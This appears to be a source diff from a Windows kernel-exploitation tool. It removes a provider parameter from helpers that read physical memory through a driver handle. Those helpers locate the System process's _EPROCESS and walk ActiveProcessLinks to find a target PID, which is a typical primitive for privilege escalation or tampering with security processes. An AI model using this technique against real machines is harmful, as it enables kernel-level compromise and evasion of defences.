@@ -46,7 +46,7 @@ DWORD64 GetFunctionOffsetFromNtoskrnl(char* FunctionName)
 }
 
 
-DWORD64 GetNtEprocessAddress(HANDLE hFile, int provId)
+DWORD64 GetNtEprocessAddress(HANDLE hFile)
 {
     DWORD64 NtVirtualBaseAddress = GetNtKernelVirtualAddresses();  // EnumDeviceDrivers to get ntoskrnl kernel VA
     DWORD64 PsInitialSystemProcessOffset = GetFunctionOffsetFromNtoskrnl("PsInitialSystemProcess");  // Get PsInitialSystemProcess offset
@@ -58,12 +58,12 @@ DWORD64 GetNtEprocessAddress(HANDLE hFile, int provId)
     DWORD64 PsInitialSystemProcessPA = TargetPhysicalAddress;
 
     // Read physical memory at PsInitialSystemProcess to get _EPROCESS virtual address
-    DWORD64 NtEprocessVirtualAddress = ReadAddressAtPhysicalAddressLocation(hFile, PsInitialSystemProcessPA, provId);
+    DWORD64 NtEprocessVirtualAddress = ReadAddressAtPhysicalAddressLocation(hFile, PsInitialSystemProcessPA);
 
     return NtEprocessVirtualAddress;
 }
 
-DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocessVA, DWORD dBuildNumber, int provId)
+DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocessVA, DWORD dBuildNumber)
 {
     int ActiveProcessLinksOffset = 0;
 
@@ -94,7 +94,7 @@ DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocess
 
     // Get the Flink for Nt's ActiveProcessLinks member and start from there
     DWORD64 InitialActiveProcessLinksFlink = NtEProcessPA + ActiveProcessLinksOffset;
-    DWORD64 ActiveProcessLinksFlink = ReadAddressAtPhysicalAddressLocation(hFile, InitialActiveProcessLinksFlink, provId);   
+    DWORD64 ActiveProcessLinksFlink = ReadAddressAtPhysicalAddressLocation(hFile, InitialActiveProcessLinksFlink);   
 
     int FlinkPID = 0;
     DWORD64 TargetProcessEProcessBase = 0;
@@ -108,7 +108,7 @@ DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocess
         for (DWORD64 i = TargetPhysicalAddress - 1; i >= TargetPhysicalAddress - 8; i--) // Check the PID member
         {
             BYTE ReadValue = 0;
-            ReadByte(hFile, i, &ReadValue, provId);
+            ReadByte(hFile, i, &ReadValue);
             FlinkPID = (FlinkPID << 8);
             FlinkPID += ReadValue;
         }
@@ -121,7 +121,7 @@ DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocess
         if (FlinkPID != TargetPID)
         {
             // Read address of ActiveProcessLinks member to traverse to the next entry in the linked list
-            ActiveProcessLinksFlink = ReadAddressAtPhysicalAddressLocation(hFile, TargetPhysicalAddress, provId);
+            ActiveProcessLinksFlink = ReadAddressAtPhysicalAddressLocation(hFile, TargetPhysicalAddress);
         }
         else
         {
